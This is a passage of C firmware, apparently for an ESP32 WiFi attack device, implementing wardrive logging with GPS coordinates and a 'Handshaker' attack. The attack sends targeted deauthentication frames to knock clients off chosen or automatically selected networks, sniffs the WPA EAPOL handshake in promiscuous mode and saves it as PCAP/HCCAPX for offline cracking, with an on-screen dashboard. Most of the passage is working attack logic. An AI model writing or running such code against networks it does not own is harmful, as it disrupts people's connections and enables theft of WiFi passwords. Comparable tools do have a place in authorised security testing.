    wdp_seen_networks[idx].ssid[32] = '\0';
    wdp_seen_networks[idx].channel = beacon_channel;
    wdp_seen_networks[idx].rssi = (int8_t)pkt->rx_ctrl.rssi;
    wdp_seen_networks[idx].authmode = authmode;
    wdp_seen_networks[idx].written_to_file = false;
    wdp_seen_networks[idx].latitude = current_gps.valid ? current_gps.latitude : 0.0f;
    wdp_seen_networks[idx].longitude = current_gps.valid ? current_gps.longitude : 0.0f;
    wdp_seen_count++;
    wdp_dwell_new_networks++;
}

static bool wdp_grow_network_buffer(void) {
    int new_capacity = wdp_seen_capacity * 2;
    size_t new_size = (size_t)new_capacity * sizeof(wdp_network_t);
    size_t free_psram = heap_caps_get_free_size(MALLOC_CAP_SPIRAM);

    if (free_psram < new_size + WDP_PSRAM_RESERVE_BYTES) {
        ESP_LOGI(TAG, "Cannot grow wardrive buffer: only %u bytes free PSRAM", (unsigned)free_psram);
        return false;
    }

    wdp_network_t *new_buf = (wdp_network_t *)heap_caps_realloc(wdp_seen_networks, new_size, MALLOC_CAP_SPIRAM);
    if (!new_buf) {
        ESP_LOGI(TAG, "Failed to realloc wardrive buffer to %d entries", new_capacity);
        return false;
    }

    memset(&new_buf[wdp_seen_capacity], 0, (size_t)(new_capacity - wdp_seen_capacity) * sizeof(wdp_network_t));
    wdp_seen_networks = new_buf;
    wdp_seen_capacity = new_capacity;
    wdp_needs_grow = false;
    ESP_LOGI(TAG, "Wardrive buffer grown to %d entries", new_capacity);
    return true;
}

static void handshake_cleanup(void) {
    ESP_LOGI(TAG, "Cleaning up handshake attack...");
    
    attack_handshake_stop();
    esp_wifi_set_promiscuous(false);
    
    g_handshaker_global_mode = false;

    handshake_attack_active = false;
    handshake_target_count = 0;
    handshake_current_index = 0;
    handshake_selected_mode = false;

    hs_ap_count = 0;
    hs_client_count = 0;
    hs_dwell_new_clients = 0;
    hs_dwell_eapol_frames = 0;
    hs_current_channel = 0;
    hs_current_target_ssid[0] = '\0';
    hs_current_client_mac[0] = '\0';
    hs_listening_after_deauth = false;
    hs_total_handshakes_captured = 0;
    if (hs_ap_targets) memset(hs_ap_targets, 0, HS_MAX_APS * sizeof(hs_ap_target_t));
    if (hs_clients) memset(hs_clients, 0, HS_MAX_CLIENTS * sizeof(hs_client_entry_t));
}

static void attack_network_with_burst(const wifi_ap_record_t *ap) {
    ESP_LOGI(TAG, "Burst attacking '%s' (Ch %d, RSSI: %d dBm)", 
                ap->ssid, ap->primary, ap->rssi);
    
    // Start attack on this network
    attack_handshake_start(ap, ATTACK_HANDSHAKE_METHOD_BROADCAST);
    
    // Send bursts with waits - 3 bursts total
    for (int burst = 0; burst < 3 && handshake_attack_active && !g_operation_stop_requested; burst++) {
        // Wait 1 second, then send next burst (first burst already sent by start)
        if (burst > 0) {
            attack_handshake_send_deauth_burst();
        }
        
        // Wait 3 seconds for clients to reconnect after deauth
        for (int i = 0; i < 30 && handshake_attack_active && !g_operation_stop_requested; i++) {
            vTaskDelay(pdMS_TO_TICKS(100));
            
            // Check if handshake captured
            if (attack_handshake_is_complete()) {
                ESP_LOGI(TAG, " Handshake captured for '%s' after burst #%d!", 
                           ap->ssid, burst + 1);
                
                // Wait 2s to capture any remaining frames
                vTaskDelay(pdMS_TO_TICKS(2000));
                attack_handshake_stop();
                return; // Success!
            }
        }
        
        ESP_LOGI(TAG, "Burst #%d complete, trying next...", burst + 1);
    }
    
    // No handshake captured after 3 bursts
    ESP_LOGI(TAG, "✗ No handshake for '%s' after 3 bursts", ap->ssid);
    attack_handshake_stop();
}

static void handshake_attack_task_selected(void) {
    ESP_LOGI(TAG, "Handshake selected-mode task running (promisc + targeted deauth).");
    ESP_LOGI(TAG, "Targets: %d networks", handshake_target_count);

    // Switch to APSTA mode so WIFI_IF_AP is available for raw frame TX
    wifi_mode_t mode;
    esp_wifi_get_mode(&mode);
    if (mode != WIFI_MODE_APSTA && mode != WIFI_MODE_AP) {
        ESP_LOGI(TAG, "Switching WiFi to APSTA mode for raw frame transmission");
        esp_wifi_set_mode(WIFI_MODE_APSTA);
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    wifi_config_t ap_config = {
        .ap = {
            .ssid = "",
            .ssid_len = 0,
            .ssid_hidden = 1,
            .channel = 1,
            .password = "",
            .max_connection = 0,
            .authmode = WIFI_AUTH_OPEN
        }
    };
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);

    hs_ap_count = 0;
    hs_client_count = 0;
    if (hs_ap_targets) memset(hs_ap_targets, 0, HS_MAX_APS * sizeof(hs_ap_target_t));
    if (hs_clients) memset(hs_clients, 0, HS_MAX_CLIENTS * sizeof(hs_client_entry_t));

    for (int i = 0; i < handshake_target_count && i < HS_MAX_APS; i++) {
        wifi_ap_record_t *ap = &handshake_targets[i];
        if (ap->ssid[0] != '\0' && check_handshake_file_exists((const char *)ap->ssid)) {
            handshake_captured[i] = true;
            ESP_LOGI(TAG, "[HS] Skipping '%s' - PCAP already exists", ap->ssid);
            continue;
        }
        int idx = hs_add_or_update_ap(ap->bssid, (const char *)ap->ssid,
                                       ap->primary,
                                       ap->authmode, ap->rssi);
        if (idx >= 0) {
            hs_ap_targets[idx].target_index = i;
        }
    }

    pcap_serializer_init();

    wifi_promiscuous_filter_t filt = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
    };
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(hs_sniffer_promiscuous_cb);
    esp_wifi_set_promiscuous(true);
    ESP_LOGI(TAG, "Promiscuous mode enabled for selected-mode attack.");

    while (handshake_attack_active && !g_operation_stop_requested) {
        bool all_done = true;
        int captured_count = 0;

        for (int t = 0; t < handshake_target_count && handshake_attack_active && !g_operation_stop_requested; t++) {
            if (handshake_captured[t]) { captured_count++; continue; }
            all_done = false;

            wifi_ap_record_t *target_ap = &handshake_targets[t];
            int ap_idx = -1;
            for (int a = 0; a < hs_ap_count; a++) {
                if (memcmp(hs_ap_targets[a].bssid, target_ap->bssid, 6) == 0) {
                    ap_idx = a; break;
                }
            }

            uint8_t channel = target_ap->primary;
            hs_current_channel = channel;
            snprintf(hs_current_target_ssid, sizeof(hs_current_target_ssid), "%s", (const char *)target_ap->ssid);
            hs_ui_update_flag = true;

            esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
            ESP_LOGI(TAG, ">>> [%d/%d] Attacking '%s' (Ch %d) - listening for clients <<<",
                     t + 1, handshake_target_count, target_ap->ssid, channel);

            int rounds_without_client = 0;
            #define HS_SELECTED_MAX_IDLE_ROUNDS 15

            for (int round = 0; handshake_attack_active && !g_operation_stop_requested; round++) {
                vTaskDelay(pdMS_TO_TICKS(500));
                if (!handshake_attack_active || g_operation_stop_requested) break;

                if (ap_idx < 0) {
                    for (int a = 0; a < hs_ap_count; a++) {
                        if (memcmp(hs_ap_targets[a].bssid, target_ap->bssid, 6) == 0) {
                            ap_idx = a; break;
                        }
                    }
                }

                if (ap_idx >= 0 && hs_ap_targets[ap_idx].complete) {
                    ESP_LOGI(TAG, "Handshake complete for '%s'!", target_ap->ssid);
                    break;
                }

                // Verify radio is on the correct channel before deauthing
                uint8_t actual_ch;
                wifi_second_chan_t sec_ch;
                esp_wifi_get_channel(&actual_ch, &sec_ch);
                if (actual_ch != channel) {
                    ESP_LOGW(TAG, "[HS] Channel mismatch! Radio on %d, target on %d. Switching.", actual_ch, channel);
                    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
                    vTaskDelay(pdMS_TO_TICKS(10));
                }

                int64_t now = esp_timer_get_time();
                int deauth_sent = 0;
                for (int c = 0; c < hs_client_count && handshake_attack_active; c++) {
                    hs_client_entry_t *cl = &hs_clients[c];
                    if (cl->hs_ap_index != ap_idx || ap_idx < 0) continue;
                    hs_ap_target_t *ap = &hs_ap_targets[ap_idx];
                    if (ap->complete) break;
                    if (cl->last_deauth_us > 0 &&
                        (now - cl->last_deauth_us) < HS_DEAUTH_COOLDOWN_US) continue;

                    snprintf(hs_current_client_mac, sizeof(hs_current_client_mac),
                             "%02X:%02X:%02X:%02X:%02X:%02X",
                             cl->mac[0], cl->mac[1], cl->mac[2],
                             cl->mac[3], cl->mac[4], cl->mac[5]);
                    hs_listening_after_deauth = false;
                    hs_ui_update_flag = true;

                    ESP_LOGI(TAG, ">>> Deauth '%s' (RadioCH:%d) -> %s <<<",
                             target_ap->ssid, channel, hs_current_client_mac);

                    size_t ssid_len = strlen((const char *)target_ap->ssid);
                    hccapx_serializer_init((const uint8_t *)target_ap->ssid, ssid_len);

                    hs_send_targeted_deauth(cl->mac, target_ap->bssid, channel);
                    cl->last_deauth_us = now;
                    cl->deauthed = true;
                    if (ap_idx >= 0) hs_ap_targets[ap_idx].last_deauth_us = now;
                    deauth_sent++;

                    if (deauth_sent >= 3) break;
                }

                if (deauth_sent > 0) {
                    rounds_without_client = 0;
                    hs_listening_after_deauth = true;
                    hs_ui_update_flag = true;
                    ESP_LOGI(TAG, "[HS] Listening for handshake on CH %d after %d deauths...", channel, deauth_sent);
                    for (int w = 0; w < 20 && handshake_attack_active && !g_operation_stop_requested; w++) {
                        vTaskDelay(pdMS_TO_TICKS(150));
                        if (ap_idx >= 0 && hs_ap_targets[ap_idx].complete) break;
                    }
                    hs_listening_after_deauth = false;
                    hs_ui_update_flag = true;

                    // If partial progress (some M captured but not complete), reset
                    // client cooldowns so we re-deauth immediately next round
                    if (ap_idx >= 0 && !hs_ap_targets[ap_idx].complete &&
                        (hs_ap_targets[ap_idx].captured_m1 || hs_ap_targets[ap_idx].captured_m2 ||
                         hs_ap_targets[ap_idx].captured_m3)) {
                        for (int c2 = 0; c2 < hs_client_count; c2++) {
                            if (hs_clients[c2].hs_ap_index == ap_idx) {
                                hs_clients[c2].last_deauth_us = 0;
                            }
                        }
                    }
                } else {
                    rounds_without_client++;
                }

                if (ap_idx >= 0 && hs_ap_targets[ap_idx].complete) break;

                if (handshake_target_count > 1 && rounds_without_client > HS_SELECTED_MAX_IDLE_ROUNDS) {
                    ESP_LOGI(TAG, "No clients found for '%s' after %d rounds, moving to next target",
                             target_ap->ssid, rounds_without_client);
                    break;
                }
            }

            if (ap_idx >= 0 && hs_ap_targets[ap_idx].complete) {
                ESP_LOGI(TAG, "Saving handshake for '%s'...", target_ap->ssid);
                if (hs_save_handshake_to_sd(ap_idx)) {
                    hs_ap_targets[ap_idx].has_existing_file = true;
                    handshake_captured[t] = true;
                    hs_total_handshakes_captured++;
                    captured_count++;
                    ESP_LOGI(TAG, "Handshake #%d captured and saved!", hs_total_handshakes_captured);
                    pcap_serializer_init();
                    hs_ui_update_flag = true;
                }
            }
        }

        if (all_done || captured_count >= handshake_target_count) {
            ESP_LOGI(TAG, "All selected networks captured! Attack complete.");
            break;
        }

        vTaskDelay(pdMS_TO_TICKS(1000));
    }

    esp_wifi_set_promiscuous(false);
    pcap_serializer_deinit();
}

static void handshake_attack_task_sniffer(void) {
    ESP_LOGI(TAG, "Handshake sniffer+D-UCB task started.");
    ESP_LOGI(TAG, "Channels: %d, D-UCB gamma=%.3f, c=%.1f, dwell=%dms",
             dual_band_channels_count, DUCB_GAMMA, DUCB_C, HS_DWELL_TIME_MS);

    // Switch to APSTA mode so WIFI_IF_AP is available for raw frame TX
    wifi_mode_t mode;
    esp_wifi_get_mode(&mode);
    if (mode != WIFI_MODE_APSTA && mode != WIFI_MODE_AP) {
        ESP_LOGI(TAG, "Switching WiFi to APSTA mode for raw frame transmission");
        esp_wifi_set_mode(WIFI_MODE_APSTA);
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    wifi_config_t ap_config = {
        .ap = {
            .ssid = "",
            .ssid_len = 0,
            .ssid_hidden = 1,
            .channel = 1,
            .password = "",
            .max_connection = 0,
            .authmode = WIFI_AUTH_OPEN
        }
    };
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);

    ducb_init();

    hs_ap_count = 0;
    hs_client_count = 0;
    if (hs_ap_targets) memset(hs_ap_targets, 0, HS_MAX_APS * sizeof(hs_ap_target_t));
    if (hs_clients) memset(hs_clients, 0, HS_MAX_CLIENTS * sizeof(hs_client_entry_t));

    pcap_serializer_init();
    hccapx_serializer_init((const uint8_t *)"", 0);

    wifi_promiscuous_filter_t filt = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
    };
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(hs_sniffer_promiscuous_cb);
    esp_wifi_set_promiscuous(true);

    ESP_LOGI(TAG, "Promiscuous mode enabled. Sniffing...");

    int64_t last_stats_us = esp_timer_get_time();

    while (handshake_attack_active && !g_operation_stop_requested) {
        int ch_idx = ducb_select_channel();
        int channel = ducb_channels[ch_idx].channel;
        hs_current_channel = channel;

        esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);

        // Show best AP on this channel in the UI immediately
        bool found_target = false;
        int64_t ui_now = esp_timer_get_time();
        for (int i = 0; i < hs_ap_count; i++) {
            if (hs_ap_targets[i].channel == channel &&
                !hs_ap_targets[i].complete && !hs_ap_targets[i].has_existing_file &&
                hs_ap_targets[i].authmode != WIFI_AUTH_OPEN &&
                (hs_ap_targets[i].last_seen_us == 0 || (ui_now - hs_ap_targets[i].last_seen_us) < HS_AP_STALE_US)) {
                snprintf(hs_current_target_ssid, sizeof(hs_current_target_ssid), "%s", hs_ap_targets[i].ssid);
                found_target = true;
                break;
            }
        }
        if (!found_target) {
            snprintf(hs_current_target_ssid, sizeof(hs_current_target_ssid), "Listening CH %d", channel);
        }
        hs_ui_update_flag = true;

        hs_dwell_new_clients = 0;
        hs_dwell_eapol_frames = 0;
        vTaskDelay(pdMS_TO_TICKS(HS_DWELL_TIME_MS));

        if (!handshake_attack_active || g_operation_stop_requested) break;

        // Verify radio channel before deauth loop
        {
            uint8_t actual_ch;
            wifi_second_chan_t sec_ch;
            esp_wifi_get_channel(&actual_ch, &sec_ch);
            if (actual_ch != (uint8_t)channel) {
                ESP_LOGW(TAG, "[HS] Channel drift! Radio on %d, expected %d. Correcting.", actual_ch, channel);
                esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);
                vTaskDelay(pdMS_TO_TICKS(5));
            }
        }

        int64_t now = esp_timer_get_time();
        int deauth_count_this_dwell = 0;

        for (int c = 0; c < hs_client_count && handshake_attack_active; c++) {
            hs_client_entry_t *cl = &hs_clients[c];
            if (cl->hs_ap_index < 0 || cl->hs_ap_index >= hs_ap_count) continue;
            hs_ap_target_t *ap = &hs_ap_targets[cl->hs_ap_index];
            if (ap->complete || ap->has_existing_file) continue;
            if (ap->channel != channel) continue;
            if (ap->authmode == WIFI_AUTH_OPEN) continue;
            if (ap->last_seen_us > 0 && (now - ap->last_seen_us) > HS_AP_STALE_US) continue;
            if (cl->last_deauth_us > 0 &&
                (now - cl->last_deauth_us) < HS_DEAUTH_COOLDOWN_US) continue;

            snprintf(hs_current_target_ssid, sizeof(hs_current_target_ssid), "%s", ap->ssid);
            snprintf(hs_current_client_mac, sizeof(hs_current_client_mac),
                     "%02X:%02X:%02X:%02X:%02X:%02X",
                     cl->mac[0], cl->mac[1], cl->mac[2],
                     cl->mac[3], cl->mac[4], cl->mac[5]);
            hs_listening_after_deauth = false;
            hs_ui_update_flag = true;

            ESP_LOGI(TAG, ">>> Attacking '%s' (RadioCH:%d) - deauth %s <<<",
                     ap->ssid, channel, hs_current_client_mac);

            size_t ssid_len = strlen(ap->ssid);
            hccapx_serializer_init((const uint8_t *)ap->ssid, ssid_len);

            hs_send_targeted_deauth(cl->mac, ap->bssid, (uint8_t)channel);
            cl->last_deauth_us = now;
            cl->deauthed = true;
            ap->last_deauth_us = now;
            deauth_count_this_dwell++;

            if (deauth_count_this_dwell >= 3) break;
        }

        if (deauth_count_this_dwell > 0) {
            hs_listening_after_deauth = true;
            hs_ui_update_flag = true;
            ESP_LOGI(TAG, "[HS] Listening for handshake on CH %d after %d deauths...", channel, deauth_count_this_dwell);
            vTaskDelay(pdMS_TO_TICKS(2000));
            hs_listening_after_deauth = false;
            hs_ui_update_flag = true;

            // Reset cooldowns for APs with partial EAPOL progress on this channel
            for (int a = 0; a < hs_ap_count; a++) {
                hs_ap_target_t *pa = &hs_ap_targets[a];
                if (pa->channel == channel && !pa->complete &&
                    (pa->captured_m1 || pa->captured_m2 || pa->captured_m3)) {
                    for (int c2 = 0; c2 < hs_client_count; c2++) {
                        if (hs_clients[c2].hs_ap_index == a) {
                            hs_clients[c2].last_deauth_us = 0;
                        }
                    }
                }
            }
        }

        double reward = (double)hs_dwell_new_clients + 3.0 * (double)hs_dwell_eapol_frames;
        ducb_update(ch_idx, reward);
        hs_ui_update_flag = true;

        for (int a = 0; a < hs_ap_count; a++) {
            hs_ap_target_t *ap = &hs_ap_targets[a];
            if (!ap->complete || ap->has_existing_file) continue;

            ESP_LOGI(TAG, "Saving complete handshake for '%s'...", ap->ssid);
            if (hs_save_handshake_to_sd(a)) {
                ap->has_existing_file = true;
                hs_total_handshakes_captured++;
                ESP_LOGI(TAG, "Handshake #%d captured! (APs: %d, Clients: %d)",
                         hs_total_handshakes_captured, hs_ap_count, hs_client_count);

                pcap_serializer_init();
                for (int j = 0; j < hs_ap_count; j++) {
                    if (!hs_ap_targets[j].complete && !hs_ap_targets[j].has_existing_file) {
                        hs_ap_targets[j].beacon_captured = false;
                    }
                }
            }
        }

        now = esp_timer_get_time();
        if (now - last_stats_us >= HS_STATS_INTERVAL_US) {
            int wpa_aps = 0, completed = 0;
            for (int i = 0; i < hs_ap_count; i++) {
                if (hs_ap_targets[i].authmode != WIFI_AUTH_OPEN) wpa_aps++;
                if (hs_ap_targets[i].complete) completed++;
            }
            ESP_LOGI(TAG, "[HS-STATS] APs:%d(WPA:%d) Clients:%d Captured:%d Ch:%d",
                     hs_ap_count, wpa_aps, hs_client_count, hs_total_handshakes_captured, channel);
            last_stats_us = now;
        }
    }

    esp_wifi_set_promiscuous(false);
    pcap_serializer_deinit();
}

static void handshake_attack_task(void *pvParameters) {
    (void)pvParameters;
    ESP_LOGI(TAG, "Handshake attack task started, mode: %s",
             handshake_selected_mode ? "selected" : "sniffer+D-UCB");
    vTaskDelay(pdMS_TO_TICKS(500));

    if (handshake_selected_mode) {
        handshake_attack_task_selected();
    } else {
        handshake_attack_task_sniffer();
    }

    ESP_LOGI(TAG, "Handshake attack task finished.");
    handshake_attack_active = false;
    esp_wifi_set_promiscuous(false);
    // Stay alive in idle loop until the stop callback signals us.
    // The stop callback sets g_operation_stop_requested=true, then waits
    // for us to delete ourselves safely (no race on the stack).
    while (!g_operation_stop_requested) {
        vTaskDelay(pdMS_TO_TICKS(200));
    }
    // Signal that we are about to exit, then self-delete
    handshake_attack_task_handle = NULL;
    vTaskDelete(NULL);
}

// Timer callback for handshake dashboard UI (every 500ms)
static void hs_ui_timer_cb(lv_timer_t *timer) {
    (void)timer;
    if (!handshake_ui_active) return;

    // When attack finished naturally, show clear completion status
    if (!handshake_attack_active) {
        if (hs_ui_target_label) {
            if (hs_total_handshakes_captured > 0) {
                char done_buf[48];
                snprintf(done_buf, sizeof(done_buf), LV_SYMBOL_OK " CAPTURED: %d", hs_total_handshakes_captured);
                lv_label_set_text(hs_ui_target_label, done_buf);
                lv_obj_set_style_text_color(hs_ui_target_label, COLOR_MATERIAL_GREEN, 0);
            } else {
                lv_label_set_text(hs_ui_target_label, LV_SYMBOL_CLOSE " Stopped");
                lv_obj_set_style_text_color(hs_ui_target_label, COLOR_MATERIAL_ORANGE, 0);
            }
        }
        if (hs_ui_status_label) {
            lv_label_set_text(hs_ui_status_label, "Press Stop & Exit");
            lv_obj_set_style_text_color(hs_ui_status_label, lv_color_make(180,180,180), 0);
        }
        // Keep showing the last channel and M1-M4 state (data preserved)
        // Find best_ap for final display
        int best_ap = -1;
        if (hs_ap_count > 0) {
            for (int i = 0; i < hs_ap_count; i++) {
                if (hs_ap_targets[i].complete && !hs_ap_targets[i].has_existing_file) { best_ap = i; break; }
            }
            if (best_ap < 0) {
                for (int i = 0; i < hs_ap_count; i++) {
                    if (!hs_ap_targets[i].has_existing_file) { best_ap = i; break; }
                }
            }
        }
        bool m1 = false, m2 = false, m3 = false, m4 = false, has_beacon = false;
        if (best_ap >= 0) {
            has_beacon = hs_ap_targets[best_ap].beacon_captured;
            m1 = hs_ap_targets[best_ap].captured_m1;
            m2 = hs_ap_targets[best_ap].captured_m2;
            m3 = hs_ap_targets[best_ap].captured_m3;
            m4 = hs_ap_targets[best_ap].captured_m4;
        }
        if (hs_ui_beacon_label) lv_obj_set_style_text_color(hs_ui_beacon_label, has_beacon ? COLOR_MATERIAL_GREEN : lv_color_make(80,80,80), 0);
        if (hs_ui_m1_label) lv_obj_set_style_text_color(hs_ui_m1_label, m1 ? COLOR_MATERIAL_GREEN : lv_color_make(80,80,80), 0);
        if (hs_ui_m2_label) lv_obj_set_style_text_color(hs_ui_m2_label, m2 ? COLOR_MATERIAL_GREEN : lv_color_make(80,80,80), 0);
        if (hs_ui_m3_label) lv_obj_set_style_text_color(hs_ui_m3_label, m3 ? COLOR_MATERIAL_GREEN : lv_color_make(80,80,80), 0);
        if (hs_ui_m4_label) lv_obj_set_style_text_color(hs_ui_m4_label, m4 ? COLOR_MATERIAL_GREEN : lv_color_make(80,80,80), 0);
        if (hs_ui_stats_label) {
            char stats_buf[128];
            snprintf(stats_buf, sizeof(stats_buf), "APs: %d  Cli: %d  Cap: %d",
                     hs_ap_count, hs_client_count, hs_total_handshakes_captured);
            lv_label_set_text(hs_ui_stats_label, stats_buf);
        }
        return;
    }

    // Channel indicator
    if (hs_ui_channel_label) {
        char ch_buf[32];
        snprintf(ch_buf, sizeof(ch_buf), "CH %d", hs_current_channel);
        lv_label_set_text(hs_ui_channel_label, ch_buf);
    }

    // Current target SSID
    if (hs_ui_target_label) {
        if (hs_current_target_ssid[0]) {
            lv_label_set_text(hs_ui_target_label, hs_current_target_ssid);
            lv_obj_set_style_text_color(hs_ui_target_label, ui_text_color(), 0);
        } else {
            lv_label_set_text(hs_ui_target_label, "Scanning...");
            lv_obj_set_style_text_color(hs_ui_target_label, ui_text_color(), 0);
        }
    }

    // Status line (client MAC + listening state)
    if (hs_ui_status_label) {
        if (hs_listening_after_deauth) {
            char st_buf[48];
            snprintf(st_buf, sizeof(st_buf), LV_SYMBOL_REFRESH " Listening... %s", hs_current_client_mac);
            lv_label_set_text(hs_ui_status_label, st_buf);
            lv_obj_set_style_text_color(hs_ui_status_label, COLOR_MATERIAL_GREEN, 0);
        } else if (hs_current_client_mac[0]) {
            char st_buf[48];
            snprintf(st_buf, sizeof(st_buf), LV_SYMBOL_CLOSE " Deauth -> %s", hs_current_client_mac);
            lv_label_set_text(hs_ui_status_label, st_buf);
            lv_obj_set_style_text_color(hs_ui_status_label, COLOR_MATERIAL_ORANGE, 0);
        } else {
            lv_label_set_text(hs_ui_status_label, "");
        }
    }

    // Find the most interesting AP to show M1-M4 progress for
    int best_ap = -1;
    if (hs_ap_count > 0) {
        for (int i = 0; i < hs_ap_count; i++) {
            if (hs_ap_targets[i].complete && !hs_ap_targets[i].has_existing_file) { best_ap = i; break; }
        }
        if (best_ap < 0) {
            for (int i = 0; i < hs_ap_count; i++) {
                if (hs_ap_targets[i].complete || hs_ap_targets[i].has_existing_file) continue;
                if (hs_ap_targets[i].channel == hs_current_channel) { best_ap = i; break; }
            }
        }
        if (best_ap < 0) {
            for (int i = 0; i < hs_ap_count; i++) {
                if (!hs_ap_targets[i].has_existing_file) { best_ap = i; break; }
            }
        }
    }

    // Beacon and M1-M4 indicators
    bool has_beacon = false, m1 = false, m2 = false, m3 = false, m4 = false;
    if (best_ap >= 0) {
        has_beacon = hs_ap_targets[best_ap].beacon_captured;
        m1 = hs_ap_targets[best_ap].captured_m1;
        m2 = hs_ap_targets[best_ap].captured_m2;
        m3 = hs_ap_targets[best_ap].captured_m3;
        m4 = hs_ap_targets[best_ap].captured_m4;
    }

    if (hs_ui_beacon_label) {
        lv_label_set_text(hs_ui_beacon_label, has_beacon ? LV_SYMBOL_WIFI : LV_SYMBOL_WARNING);
        lv_obj_set_style_text_color(hs_ui_beacon_label, has_beacon ? COLOR_MATERIAL_GREEN : lv_color_make(80,80,80), 0);
    }
    if (hs_ui_m1_label) {
        lv_label_set_text(hs_ui_m1_label, m1 ? "M1" : "M1");
        lv_obj_set_style_text_color(hs_ui_m1_label, m1 ? COLOR_MATERIAL_GREEN : lv_color_make(80,80,80), 0);
    }
    if (hs_ui_m2_label) {
        lv_label_set_text(hs_ui_m2_label, m2 ? "M2" : "M2");
        lv_obj_set_style_text_color(hs_ui_m2_label, m2 ? COLOR_MATERIAL_GREEN : lv_color_make(80,80,80), 0);
    }
    if (hs_ui_m3_label) {
        lv_label_set_text(hs_ui_m3_label, m3 ? "M3" : "M3");
        lv_obj_set_style_text_color(hs_ui_m3_label, m3 ? COLOR_MATERIAL_GREEN : lv_color_make(80,80,80), 0);
    }
    if (hs_ui_m4_label) {
        lv_label_set_text(hs_ui_m4_label, m4 ? "M4" : "M4");
        lv_obj_set_style_text_color(hs_ui_m4_label, m4 ? COLOR_MATERIAL_GREEN : lv_color_make(80,80,80), 0);
    }

    // Stats
    if (hs_ui_stats_label) {
        char stats_buf[128];
        snprintf(stats_buf, sizeof(stats_buf), "APs: %d  Cli: %d  Cap: %d",
                 hs_ap_count, hs_client_count, hs_total_handshakes_captured);
        lv_label_set_text(hs_ui_stats_label, stats_buf);
    }
}

static void handshake_yes_btn_cb(lv_event_t *e)
{
    (void)e;

    if (handshake_attack_active || handshake_attack_task_handle != NULL) {
        ESP_LOGW(TAG, "Handshake attack already running");
        return;
    }

    g_operation_stop_requested = false;
    handshake_target_count = 0;
    handshake_current_index = 0;
    memset(handshake_targets, 0, sizeof(handshake_targets));
    memset(handshake_captured, 0, sizeof(handshake_captured));

    scan_done_ui_flag = false;

    if (g_shared_selected_count > 0) {
        handshake_selected_mode = true;
        handshake_target_count = g_shared_selected_count;
        for (int i = 0; i < g_shared_selected_count; i++) {
            int idx = g_shared_selected_indices[i];
            memcpy(&handshake_targets[i], &g_shared_scan_results[idx], sizeof(wifi_ap_record_t));
        }
    } else {
        handshake_selected_mode = false;
        if (g_shared_scan_count > 0) {
            handshake_target_count = (g_shared_scan_count < MAX_AP_CNT) ? g_shared_scan_count : MAX_AP_CNT;
            memcpy(handshake_targets, g_shared_scan_results, handshake_target_count * sizeof(wifi_ap_record_t));
        } else {
            handshake_waiting_for_scan = true;
        }
    }

    create_function_page_base("Handshaker");
    handshake_ui_active = true;

    // ─── D-UCB Channel indicator (top left) ────────────────────────
    lv_obj_t *ch_box = lv_obj_create(function_page);
    lv_obj_set_size(ch_box, 80, 52);
    lv_obj_align(ch_box, LV_ALIGN_TOP_LEFT, 4, 38);
    lv_obj_set_style_bg_color(ch_box, lv_color_make(30, 30, 45), 0);
    lv_obj_set_style_border_color(ch_box, lv_color_make(0, 188, 212), 0);
    lv_obj_set_style_border_width(ch_box, 2, 0);
    lv_obj_set_style_radius(ch_box, 10, 0);
    lv_obj_set_style_pad_all(ch_box, 0, 0);
    lv_obj_clear_flag(ch_box, LV_OBJ_FLAG_SCROLLABLE);

    lv_obj_t *ch_title = lv_label_create(ch_box);
    lv_label_set_text(ch_title, "D-UCB");
    lv_obj_set_style_text_color(ch_title, lv_color_make(0, 188, 212), 0);
    lv_obj_set_style_text_font(ch_title, &lv_font_montserrat_12, 0);
    lv_obj_align(ch_title, LV_ALIGN_TOP_MID, 0, 4);

    hs_ui_channel_label = lv_label_create(ch_box);
    lv_label_set_text(hs_ui_channel_label, "CH --");
    lv_obj_set_style_text_color(hs_ui_channel_label, ui_text_color(), 0);
    lv_obj_set_style_text_font(hs_ui_channel_label, &lv_font_montserrat_14, 0);
    lv_obj_align(hs_ui_channel_label, LV_ALIGN_BOTTOM_MID, 0, -4);

    // ─── Current target SSID + client status (top right) ──────────
    lv_obj_t *target_box = lv_obj_create(function_page);
    lv_obj_set_size(target_box, 152, 52);
    lv_obj_align(target_box, LV_ALIGN_TOP_LEFT, 88, 38);
    lv_obj_set_style_bg_color(target_box, lv_color_make(30, 30, 45), 0);
    lv_obj_set_style_border_color(target_box, lv_color_make(63, 81, 181), 0);
    lv_obj_set_style_border_width(target_box, 2, 0);
    lv_obj_set_style_radius(target_box, 10, 0);
    lv_obj_set_style_pad_all(target_box, 0, 0);
    lv_obj_clear_flag(target_box, LV_OBJ_FLAG_SCROLLABLE);

    lv_obj_t *tgt_title = lv_label_create(target_box);
    lv_label_set_text(tgt_title, "TARGET");
    lv_obj_set_style_text_color(tgt_title, lv_color_make(63, 81, 181), 0);
    lv_obj_set_style_text_font(tgt_title, &lv_font_montserrat_12, 0);
    lv_obj_align(tgt_title, LV_ALIGN_TOP_LEFT, 6, 3);

    hs_ui_target_label = lv_label_create(target_box);
    lv_label_set_text(hs_ui_target_label, "Scanning...");
    lv_obj_set_style_text_color(hs_ui_target_label, ui_text_color(), 0);
    lv_obj_set_style_text_font(hs_ui_target_label, &lv_font_montserrat_12, 0);
    lv_obj_set_width(hs_ui_target_label, 130);
    lv_label_set_long_mode(hs_ui_target_label, LV_LABEL_LONG_SCROLL_CIRCULAR);
    lv_obj_align(hs_ui_target_label, LV_ALIGN_TOP_LEFT, 6, 18);

    hs_ui_status_label = lv_label_create(target_box);
    lv_label_set_text(hs_ui_status_label, "");
    lv_obj_set_style_text_color(hs_ui_status_label, COLOR_MATERIAL_ORANGE, 0);
    lv_obj_set_style_text_font(hs_ui_status_label, &lv_font_montserrat_12, 0);
